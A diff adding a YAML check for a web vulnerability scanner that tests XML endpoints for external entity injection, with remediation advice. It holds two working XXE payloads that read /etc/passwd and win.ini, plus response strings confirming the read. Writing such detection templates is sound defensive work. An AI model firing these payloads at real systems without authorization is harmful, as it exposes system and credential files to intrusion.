@@ -1,0 +1,19 @@
+# XML External Entity injection detection
+metadata:
+  name: XML External Entity injection (XXE)
+  description: Tests XML endpoints for external entity injection.
+  author: BurpFree
+  version: "1.0"
+  tags: [active, xxe, injection]
+severity: high
+confidence: tentative
+type: active
+conditions:
+  content_type: "application/xml"
+payloads:
+  - value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+    match_body: "root:x:0:0"
+  - value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+    match_body: "[fonts]"
+remediation: >
+  Disable external entity processing in XML parsers. Use JSON instead of XML where possible.
